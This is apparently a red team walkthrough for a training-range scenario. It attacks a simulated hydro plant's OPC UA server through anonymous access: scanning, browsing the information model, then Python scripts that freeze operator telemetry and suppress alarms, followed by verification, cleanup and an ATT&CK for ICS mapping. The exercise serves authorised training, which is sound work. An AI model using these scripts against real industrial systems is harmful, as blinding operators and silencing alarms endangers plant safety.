# Red Team Write-up — Scenario 1: The Trusted Maintenance Window

## 1. Exercise scope

This procedure is intended only for the isolated Prabal Urja live-fire range. Replace `<TARGET_IP>` with the assigned Scenario 1 target. Do not scan outside the authorised exercise segment.

### Starting information provided to Red

- One target IP address
- Mission: determine whether the Unit-2 maintenance pathway can be misused to create an operationally meaningful telemetry effect
- Constraint: preserve host and industrial-service availability

Red is not given service names, ports, credentials, node identifiers, or the internal asset relationship.

## 2. Completion conditions

A complete solve demonstrates all of the following:

1. identification of the industrial application endpoint;
2. confirmation that an unauthenticated session is possible;
3. discovery of the Prabal Urja Unit-2 information model;
4. correct use of the approved maintenance reference;
5. activation of the telemetry maintenance hold without crashing the service;
6. verification of the operational effect in the operator console;
7. discovery and reporting of the downstream controller relationship for Scenario 2;
8. cleanup or restoration at the end of the engagement.

## 3. Prepare the Red workstation

The commands below use a Python virtual environment so the host Python installation is not changed.

```bash
mkdir -p ~/prabal-s01
cd ~/prabal-s01
python3 -m venv .venv
source .venv/bin/activate
python -m pip install --upgrade pip
pip install asyncua==1.1.8
```

Record the target without embedding it into scripts:

```bash
export TARGET_IP='<TARGET_IP>'
```

Confirm it was set correctly:

```bash
printf 'Target: %s\n' "$TARGET_IP"
```

## 4. External reconnaissance

### 4.1 Confirm host reachability without relying on ICMP

```bash
nmap -Pn -n -sT --top-ports 1000 "$TARGET_IP"
```

Then perform a full TCP scan inside the assigned range:

```bash
nmap -Pn -n -sT -p- --min-rate 1000 --max-retries 2 "$TARGET_IP" -oA prabal-s01-full
```

Expected relevant findings in the default build are TCP 4840 and TCP 8088. Ports may be changed by the range administrator, so use the scan result rather than assuming them.

### 4.2 Perform targeted service identification

```bash
nmap -Pn -n -sV -p 4840,8088 "$TARGET_IP" -oA prabal-s01-services
```

Evidence to preserve:

```bash
sha256sum prabal-s01-full.* prabal-s01-services.* | tee recon-sha256.txt
```

### 4.3 Review the operator-facing service

```bash
curl -sS -D hmi-headers.txt "http://$TARGET_IP:8088/" -o hmi-index.html
head -30 hmi-index.html
```

Open the same URL in a browser. The page provides operational context but does not expose maintenance instructions or credentials.

Record the initial values displayed for:

- Active Power
- Frequency
- Channel State
- Telemetry Quality
- Maintenance State
- Scenario State

## 5. Confirm the OPC UA endpoint and security posture

Create `endpoint_discovery.py`:

```python
import asyncio
import os
from asyncua import Client

async def main():
    endpoint = f"opc.tcp://{os.environ['TARGET_IP']}:4840"
    client = Client(url=endpoint, timeout=5)
    endpoints = await client.connect_and_get_server_endpoints()
    for item in endpoints:
        print("EndpointURL:", item.EndpointUrl)
        print("SecurityPolicyUri:", item.SecurityPolicyUri)
        print("SecurityMode:", item.SecurityMode)
        print("UserIdentityTokens:", [token.TokenType for token in item.UserIdentityTokens])
        print("---")

asyncio.run(main())
```

Run it:

```bash
python endpoint_discovery.py | tee endpoint-discovery.txt
```

Important observations:

- the endpoint accepts OPC UA Binary over TCP;
- SecurityPolicy `None` is available;
- an anonymous identity token is accepted;
- no application credential is required for namespace browsing.

If the endpoint-discovery helper changes in a later `asyncua` release, the decisive validation is the successful anonymous session and namespace browse in the next step.

## 6. Browse the Unit-2 information model

Create `browse_prabal.py`:

```python
import asyncio
import os
from asyncua import Client

NS_URI = "urn:prabal-urja:hydro:unit2"

async def walk(node, namespace_index, depth=0, max_depth=8):
    if depth > max_depth:
        return
    try:
        browse_name = await node.read_browse_name()
        display_name = await node.read_display_name()
        node_class = await node.read_node_class()
    except Exception as exc:
        print("  " * depth, node.nodeid, "<read error>", exc)
        return

    print(
        "  " * depth
        + f"{node.nodeid.to_string()} | {browse_name.Name} | {display_name.Text} | {node_class.name}"
    )

    for child in await node.get_children():
        if child.nodeid.NamespaceIndex == namespace_index:
            await walk(child, namespace_index, depth + 1, max_depth)

async def main():
    endpoint = f"opc.tcp://{os.environ['TARGET_IP']}:4840"
    async with Client(url=endpoint, timeout=5) as client:
        idx = await client.get_namespace_index(NS_URI)
        print(f"Namespace index: {idx}")
        await walk(client.nodes.objects, idx)

asyncio.run(main())
```

Run it:

```bash
python browse_prabal.py | tee namespace-tree.txt
```

Key areas to identify:

```text
PrabalUrja/HydroPlant/Unit2/Generator
PrabalUrja/HydroPlant/Unit2/Turbine
PrabalUrja/HydroPlant/Unit2/TelemetryGateway
PrabalUrja/HydroPlant/Unit2/EngineeringMetadata
PrabalUrja/HydroPlant/Unit2/Health
```

Do not immediately write arbitrary values. First determine which nodes are telemetry, which are engineering metadata and which represent maintenance controls.

## 7. Read engineering and maintenance context

Create `read_context.py`:

```python
import asyncio
import os
from asyncua import Client

NS_URI = "urn:prabal-urja:hydro:unit2"
BASE = "PrabalUrja/HydroPlant/Unit2"

NODES = {
    "work_order": f"{BASE}/EngineeringMetadata/LastApprovedWorkOrder",
    "downstream_controller": f"{BASE}/EngineeringMetadata/DownstreamController",
    "southbound_protocol": f"{BASE}/EngineeringMetadata/SouthboundProtocol",
    "maintenance_mode": f"{BASE}/TelemetryGateway/MaintenanceMode",
    "freeze_telemetry": f"{BASE}/TelemetryGateway/FreezeTelemetry",
    "alarm_suppression": f"{BASE}/TelemetryGateway/AlarmSuppression",
    "ticket": f"{BASE}/TelemetryGateway/MaintenanceTicket",
    "override_accepted": f"{BASE}/TelemetryGateway/OverrideAccepted",
    "scenario_state": f"{BASE}/Health/ScenarioState",
}

async def main():
    endpoint = f"opc.tcp://{os.environ['TARGET_IP']}:4840"
    async with Client(url=endpoint, timeout=5) as client:
        idx = await client.get_namespace_index(NS_URI)
        for label, node_id in NODES.items():
            node = client.get_node(f"ns={idx};s={node_id}")
            value = await node.read_value()
            access = await node.read_access_level()
            print(f"{label}: value={value!r} access={access}")

asyncio.run(main())
```

Run it:

```bash
python read_context.py | tee engineering-context.txt
```

Expected findings include:

- a valid work-order reference;
- a group of maintenance variables with write permission;
- a downstream controller identifier;
- a southbound industrial protocol.

The maintenance work order is legitimate operational metadata. The security failure is that possessing its identifier is treated as sufficient authority, even through an anonymous session.

## 8. Activate the unauthorised maintenance override

Create `activate_override.py`:

```python
import asyncio
import os
from asyncua import Client, ua

NS_URI = "urn:prabal-urja:hydro:unit2"
BASE = "PrabalUrja/HydroPlant/Unit2"

async def write(client, idx, relative, value, variant_type):
    node = client.get_node(f"ns={idx};s={BASE}/{relative}")
    await node.write_value(ua.Variant(value, variant_type))
    confirmed = await node.read_value()
    print(f"{relative} -> {confirmed!r}")

async def main():
    endpoint = f"opc.tcp://{os.environ['TARGET_IP']}:4840"
    async with Client(url=endpoint, timeout=5) as client:
        idx = await client.get_namespace_index(NS_URI)

        # Use a controlled sequence. Do not write generator process values.
        await write(
            client, idx,
            "TelemetryGateway/MaintenanceTicket",
            "PU-MW-0427",
            ua.VariantType.String,
        )
        await write(
            client, idx,
            "TelemetryGateway/MaintenanceMode",
            True,
            ua.VariantType.Boolean,
        )
        await write(
            client, idx,
            "TelemetryGateway/FreezeTelemetry",
            True,
            ua.VariantType.Boolean,
        )
        await write(
            client, idx,
            "TelemetryGateway/AlarmSuppression",
            True,
            ua.VariantType.Boolean,
        )

        await asyncio.sleep(1)
        accepted = await client.get_node(
            f"ns={idx};s={BASE}/TelemetryGateway/OverrideAccepted"
        ).read_value()
        state = await client.get_node(
            f"ns={idx};s={BASE}/Health/ScenarioState"
        ).read_value()
        quality = await client.get_node(
            f"ns={idx};s={BASE}/TelemetryGateway/TelemetryQuality"
        ).read_value()

        print(f"OverrideAccepted={accepted}")
        print(f"ScenarioState={state}")
        print(f"TelemetryQuality={quality}")

asyncio.run(main())
```

Run it:

```bash
python activate_override.py | tee override-result.txt
```

A successful result shows:

```text
OverrideAccepted=True
ScenarioState=UNAUTHORISED_MAINTENANCE_OVERRIDE
TelemetryQuality=UNCERTAIN_LAST_USABLE_VALUE
```

## 9. Validate the process effect

### 9.1 Observe the HMI

Refresh:

```text
http://<TARGET_IP>:8088/
```

The operator telemetry should stop changing. The gateway state should indicate a maintenance hold and the data quality should indicate a last-usable-value condition.

### 9.2 Validate through the HMI API

```bash
curl -sS "http://$TARGET_IP:8088/api/state" | jq . | tee hmi-state-after.json
```

Wait approximately ten seconds and collect a second sample:

```bash
sleep 10
curl -sS "http://$TARGET_IP:8088/api/state" | jq . | tee hmi-state-after-10s.json
```

Compare the displayed power and frequency. They should remain unchanged while the override is active.

### 9.3 Confirm service availability

The objective is controlled manipulation, not denial of service:

```bash
nc -zvw3 "$TARGET_IP" 4840
curl -fsS "http://$TARGET_IP:8088/api/health" | jq .
```

Both services must remain available.

## 10. Record the Scenario 2 pivot evidence

The required follow-on finding is:

```text
Downstream controller: PU-GOV-PLC-02
Southbound protocol: Modbus/TCP
```

Do not invent or guess a Scenario 2 IP. The exercise orchestrator maps the controller identifier to its host only after Scenario 2 is deployed and approved.

## 11. Cleanup

Create `clear_override.py`:

```python
import asyncio
import os
from asyncua import Client, ua

NS_URI = "urn:prabal-urja:hydro:unit2"
BASE = "PrabalUrja/HydroPlant/Unit2/TelemetryGateway"

async def main():
    endpoint = f"opc.tcp://{os.environ['TARGET_IP']}:4840"
    async with Client(url=endpoint, timeout=5) as client:
        idx = await client.get_namespace_index(NS_URI)
        changes = [
            ("AlarmSuppression", False, ua.VariantType.Boolean),
            ("FreezeTelemetry", False, ua.VariantType.Boolean),
            ("MaintenanceMode", False, ua.VariantType.Boolean),
            ("MaintenanceTicket", "", ua.VariantType.String),
        ]
        for name, value, kind in changes:
            node = client.get_node(f"ns={idx};s={BASE}/{name}")
            await node.write_value(ua.Variant(value, kind))
            print(name, await node.read_value())

asyncio.run(main())
```

Run:

```bash
python clear_override.py | tee cleanup-result.txt
```

Confirm that live values resume:

```bash
curl -sS "http://$TARGET_IP:8088/api/state" | jq '{channel_state,telemetry_quality,override_accepted,scenario_state}'
```

## 12. Evidence package for the Red report

```bash
mkdir -p evidence
cp -a \
  prabal-s01-full.* \
  prabal-s01-services.* \
  recon-sha256.txt \
  hmi-headers.txt \
  hmi-index.html \
  endpoint-discovery.txt \
  namespace-tree.txt \
  engineering-context.txt \
  override-result.txt \
  hmi-state-after.json \
  hmi-state-after-10s.json \
  cleanup-result.txt \
  evidence/

tar -czf prabal-s01-red-evidence.tar.gz evidence
sha256sum prabal-s01-red-evidence.tar.gz | tee prabal-s01-red-evidence.tar.gz.sha256
```

## 13. ATT&CK for ICS mapping

| Activity | Technique |
|---|---|
| Service and endpoint discovery | T0846.001 — Remote System Discovery: Port Scan |
| Anonymous use of an industrial application endpoint | T0869 — Standard Application Layer Protocol |
| OPC UA write operations outside authorised workflow | T1692.001 — Unauthorized Message: Command Message |
| Maintenance state and alarm parameter manipulation | T0836 — Modify Parameter |

## 14. Common mistakes

- Writing arbitrary values to generator telemetry nodes rather than understanding the information model
- Flooding TCP 4840 or repeatedly opening sessions
- Treating the web console as the vulnerable component
- Stopping the OPC UA server, which violates the availability objective
- Reporting only the maintenance work-order value and missing the downstream controller relationship
- Leaving the telemetry override active after the engagement
